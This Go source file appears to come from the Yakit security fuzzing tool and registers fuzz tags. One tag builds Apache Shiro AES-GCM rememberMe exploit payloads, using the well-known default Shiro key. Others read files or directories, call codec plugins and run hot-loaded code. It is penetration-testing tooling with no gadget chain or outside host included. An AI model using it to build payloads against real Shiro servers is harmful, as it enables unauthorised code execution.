	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "shiro:gcm",
		ErrorInfoHandler: func(s string) ([]string, error) {
			var (
				key       = "kPH+bIxk5D2deZiIxcaaaA=="
				shiroByte string
			)

			params := strings.Split(s, ",")
			if len(params) == 2 {
				key = params[0]
				shiroByte = params[1]
			} else {
				shiroByte = s
			}
			bytes, err := codec.DecodeBase64(key)
			if err != nil {
				return nil, err
			}
			decodeBase64, err := codec.DecodeBase64(shiroByte)
			if err != nil {
				return nil, err
			}
			iv := utils.RandBytes(16)
			paddingPayload := codec.PKCS5Padding(decodeBase64, 16)
			encrypt, err := codec.AESGCMEncrypt(bytes, paddingPayload, iv)
			if err != nil {
				return nil, err
			}
			encodeBase64 := codec.EncodeBase64(append(iv, encrypt...))
			return []string{encodeBase64}, nil
		},
		Description:         "生成shiro-gcm类型的payload",
		TagNameVerbose:      "shiro-gcm",
		ArgumentDescription: "{{string(key:密钥)}}{{string(payload:利用链)}}",
	})
}

func Fuzz_WithEnableDangerousTag() FuzzConfigOpt {
	return func(config *FuzzTagConfig) {
		for _, opt := range FuzzFileOptions() {
			opt(config)
		}
		for _, opt := range FuzzCodecOptions() {
			opt(config)
		}
	}
}

func FuzzCodecOptions() []FuzzConfigOpt {
	var opt []FuzzConfigOpt
	for _, t := range CodecTag() {
		opt = append(opt, Fuzz_WithExtraFuzzTag(t.TagName, t))
		for _, a := range t.Alias {
			opt = append(opt, Fuzz_WithExtraFuzzTag(a, t))
		}
	}
	return opt
}

func Fuzz_WithEnableCodectag() FuzzConfigOpt {
	return func(config *FuzzTagConfig) {
		for _, opt := range FuzzCodecOptions() {
			opt(config)
		}
	}
}

func FuzzFileOptions() []FuzzConfigOpt {
	var opt []FuzzConfigOpt
	for _, t := range FileTag() {
		opt = append(opt, Fuzz_WithExtraFuzzTag(t.TagName, t))
		for _, a := range t.Alias {
			opt = append(opt, Fuzz_WithExtraFuzzTag(a, t))
		}
	}
	return opt
}

func Fuzz_WithEnableFileTag() FuzzConfigOpt {
	return func(config *FuzzTagConfig) {
		for _, opt := range FuzzFileOptions() {
			opt(config)
		}
	}
}

func CodecTag() []*FuzzTagDescription {
	return []*FuzzTagDescription{
		{
			TagName: "codec",
			Handler: func(s string) []string {
				s = strings.Trim(s, " ()")

				if codecCaller == nil {
					return []string{s}
				}

				lastDividerIndex := strings.LastIndexByte(s, '|')
				if lastDividerIndex < 0 {
					script, err := codecCaller(s, "")
					if err != nil {
						log.Errorf("codec caller error: %s", err)
						return []string{s}
					}
					// log.Errorf("fuzz.codec no plugin / param specific")
					return []string{script}
				}
				name, params := s[:lastDividerIndex], s[lastDividerIndex+1:]
				script, err := codecCaller(name, params)
				if err != nil {
					log.Errorf("codec caller error: %s", err)
					return []string{s}
				}
				return []string{script}
			},
			Description:         "调用 Yakit Codec 插件",
			TagNameVerbose:      "调用Codec插件",
			ArgumentDescription: "{{string_split(name:插件名)}}{{string(params:参数)}}",
		},
		{
			TagName: "codec:line",
			Handler: func(s string) []string {
				if codecCaller == nil {
					return fuzztagfallback
				}

				s = strings.Trim(s, " ()")
				lastDividerIndex := strings.LastIndexByte(s, '|')
				if lastDividerIndex < 0 {
					log.Errorf("fuzz.codec no plugin / param specific")
					return fuzztagfallback
				}
				name, params := s[:lastDividerIndex], s[lastDividerIndex+1:]
				script, err := codecCaller(name, params)
				if err != nil {
					log.Errorf("codec caller error: %s", err)
					return fuzztagfallback
				}
				var results []string
				for line := range utils.ParseLines(script) {
					results = append(results, line)
				}
				return results
			},
			Description:         "调用 Yakit Codec 插件，把结果解析成行",
			TagNameVerbose:      "调用Codec插件，结果按行解析",
			ArgumentDescription: "{{string_split(name:插件名)}}{{string(params:参数)}}",
		},
	}
}

func FileTag() []*FuzzTagDescription {
	return []*FuzzTagDescription{
		{
			TagName: "file:line",
			HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
				s = strings.Trim(s, " ()")
				empty := true
				for _, lineFile := range utils.PrettifyListFromStringSplited(s, "|") {
					lineChan, err := utils.FileLineReaderWithContext(lineFile, ctx)
					if err != nil {
						log.Errorf("fuzztag read file failed: %s", err)
						continue
					}
					for line := range lineChan {
						if err := tryYield(ctx, yield, string(line)); err != nil {
							return err
						} else {
							empty = false
						}
					}
				}
				if empty {
					return tryYield(ctx, yield, "")
				}
				return nil
			},
			Alias:               []string{"fileline", "file:lines"},
			Description:         "解析文件名（可以用 `|` 分割），把文件中的内容按行反回成数组，定义为 `{{file:line(/tmp/test.txt)}}` 或 `{{file:line(/tmp/test.txt|/tmp/1.txt)}}`",
			TagNameVerbose:      "文件按行解析",
			ArgumentDescription: "{{list(string_split(/tmp/test.txt:文件名))}}",
		},
		{
			TagName: "file:dir",
			HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
				empty := true
				for _, lineFile := range utils.PrettifyListFromStringSplited(s, "|") {
					err := filesys.Recursive(lineFile, filesys.WithFileStat(func(s string, info fs.FileInfo) error {
						fileContent, err := os.ReadFile(s)
						if err != nil {
							log.Errorf("fuzz.filedir read file failed: %s", err)
							return nil
						}
						if err := tryYield(ctx, yield, string(fileContent)); err != nil {
							return err
						} else {
							empty = false
						}
						return nil
					}))
					if err != nil {
						log.Errorf("fuzz.filedir read dir failed: %s", err)
						continue
					}
				}
				if empty {
					return tryYield(ctx, yield, "")
				}
				return nil
			},
			Alias:               []string{"filedir"},
			Description:         "解析文件夹，把文件夹中文件的内容读取出来，读取成数组返回，定义为 `{{file:dir(/tmp/test)}}` 或 `{{file:dir(/tmp/test|/tmp/1)}}`",
			TagNameVerbose:      "文件夹解析",
			ArgumentDescription: "{{list(string_split(/tmp/test:文件夹名))}}",
		},
		{
			TagName: "file",
			HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
				s = strings.Trim(s, " ()")
				empty := true
				for _, lineFile := range utils.PrettifyListFromStringSplited(s, "|") {
					fileRaw, err := ioutil.ReadFile(lineFile)
					if err != nil {
						log.Errorf("fuzz.files read file failed: %s", err)
						continue
					}
					if err := tryYield(ctx, yield, string(fileRaw)); err != nil {
						return err
					} else {
						empty = false
					}
				}
				if empty {
					return tryYield(ctx, yield, "")
				}
				return nil
			},
			Description:         "读取文件内容，可以支持多个文件，用竖线分割，`{{file(/tmp/1.txt)}}` 或 `{{file(/tmp/1.txt|/tmp/test.txt)}}`",
			TagNameVerbose:      "文件读取",
			ArgumentDescription: "{{list(string_split(/tmp/1.txt:文件名))}}",
		},
	}
}

func HotPatchFuzztag(hotPatchHandler func(string, func(string)) error) *FuzzTagDescription {
	return &FuzzTagDescription{
		TagName:               "yak",
		HandlerAndYieldString: hotPatchHandler,
		Description:           "执行热加载代码",
		TagNameVerbose:        "执行热加载代码",
		ArgumentDescription:   "{{string_split(handle:函数名)}}{{optional(string(params:参数))}}",
	}
}

func HotPatchDynFuzztag(hotPatchHandler func(string, func(string)) error) *FuzzTagDescription {
	return &FuzzTagDescription{
		TagName:               "yak:dyn",
		HandlerAndYieldString: hotPatchHandler,
		Description:           "执行热加载代码",
		TagNameVerbose:        "执行热加载代码",
		ArgumentDescription:   "{{string_split(handle:函数名)}}{{optional(string(params:参数))}}",
		IsDyn:                 true,
	}
}
